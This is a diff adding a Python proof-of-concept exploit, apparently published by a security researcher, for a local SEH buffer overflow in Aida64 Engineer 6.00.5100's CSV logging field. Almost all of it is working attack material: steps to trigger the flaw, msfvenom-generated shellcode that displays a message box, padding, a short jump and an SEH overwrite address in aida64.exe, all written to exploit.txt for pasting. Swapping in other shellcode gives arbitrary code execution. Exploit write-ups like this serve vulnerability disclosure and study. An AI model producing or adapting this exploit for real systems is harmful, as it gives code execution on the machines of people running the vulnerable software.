@@ -1,0 +1,55 @@
+#!/usr/bin/python
+##########################################################################################################
+# Exploit		:	Aida64 6.00.5100 'Log to CSV File' Local SEH Buffer Overflow Exploit
+# Author 		:	Nipun Jaswal
+# Tested On		:	Windows 7 Home Basic(x86)
+# Version		: 	6.00.5100
+# Release Date	:	31/May/2019
+# Build			:	21/May/2019
+# Vendor Homepage: https://www.aida64.com/downloads
+# Software Link: https://www.aida64.com/products/aida64-engineer
+# CVE : CVE-2019-
+
+##########################################################################################################
+##################################Steps to Reproduce######################################################
+#1) Open Aida64 Engineer
+#2) Navigate to File-> Preferences
+#3) Logging --> 'Log Sensor Reading to CSV log File'
+#4) Paste the Content from exploit.txt to the 'Log Sensor Reading to CSV log File' field
+#5) Press Apply-> OK
+#6) Exit the Application via File-->Exit
+##########################################//SHELLCODE//###################################################
+# msfvenom -p windows/messagebox TEXT=NIPUN-NIPUN -b '\x00\x0a\x0d' -f py --smallest
+buf =  ""
+buf += "\xb8\xb6\xf7\x5f\x31\xda\xd5\xd9\x74\x24\xf4\x5f\x2b"
+buf += "\xc9\xb1\x42\x31\x47\x14\x83\xef\xfc\x03\x47\x10\x54"
+buf += "\x02\x86\xda\x03\x34\x4d\x39\xc7\xf6\x7c\xf3\x50\xc8"
+buf += "\x49\x90\x15\x5b\x7a\xd2\x5f\x90\xf1\x92\x83\x23\x43"
+buf += "\x53\x30\x4d\x6c\xe8\x70\x8a\x23\xf6\x09\x19\xe2\x07"
+buf += "\x20\x22\xf4\x68\x49\xb1\xd3\x4c\xc6\x0f\x20\x06\x8c"
+buf += "\xa7\x20\x19\xc6\x33\x9a\x01\x9d\x1e\x3b\x33\x4a\x7d"
+buf += "\x0f\x7a\x07\xb6\xfb\x7d\xf9\x86\x04\x4c\xc5\x15\x56"
+buf += "\x2b\x05\x91\xa0\xf5\x4a\x57\xae\x32\xbf\x9c\x8b\xc0"
+buf += "\x1b\x75\x99\xd9\xe8\xdf\x45\x1b\x05\xb9\x0e\x17\x92"
+buf += "\xcd\x4b\x34\x25\x39\xe0\x40\xae\xbc\x1f\xc1\xf4\x9a"
+buf += "\xc3\xb3\x37\x50\xf3\x1a\x63\x1c\xe1\xd4\x49\x77\x64"
+buf += "\xa8\x43\x64\x2a\xdd\xc4\x8b\x34\xe2\x73\x36\xcf\xa6"
+buf += "\xfd\x61\x2d\xab\x86\x8e\x96\x1e\x60\x20\x29\x61\x8f"
+buf += "\xb4\x93\x96\x07\xab\x77\x87\x96\x5b\xbb\xf5\x36\xf8"
+buf += "\xd3\x8c\x35\x65\x56\x5f\x62\xed\xca\xbb\x9e\x67\x14"
+buf += "\x95\x61\x22\xdd\x93\x5f\x9d\x66\x0b\xfd\x53\x25\xcb"
+buf += "\x1d\x48\x07\x3c\x42\x6f\x58\x43\x14\xe0\xdf\xe4\xc4"
+buf += "\x96\x7e\x72\x61\x25\xe9\x31\x0c\xda\x9a\xf8\x15\x94"
+buf += "\x01\xdf\xa3\x2c\x5a\x77\xe3\x7b\xd3\xd0\x6b\xca\xc6"
+buf += "\xae\x22\xba\x56\x66\xe4\x6f\x56\xb1\x8c\xdc\xbc\x4a"
+buf += "\x05\x3d\x8d\x9e\x47\xed\xbf\x4c\x98\xc1\x71\xb1\x36"
+
+##########################################//SHELLCODE//###################################################
+junk= "\x41" * (1106 - len(buf))
+seh = "\x87\xe2\x1d\x01" #0x011de287 - [aida64.exe]
+nseh = "\xeb\xf8\x90\x90"
+buffer = junk + buf +"\xe9\xdd\xfe\xff\xff\xcc" + nseh + seh
+handle = open("exploit.txt","w")
+handle.write(buffer)
+handle.close()
+##########################################//END//#########################################################
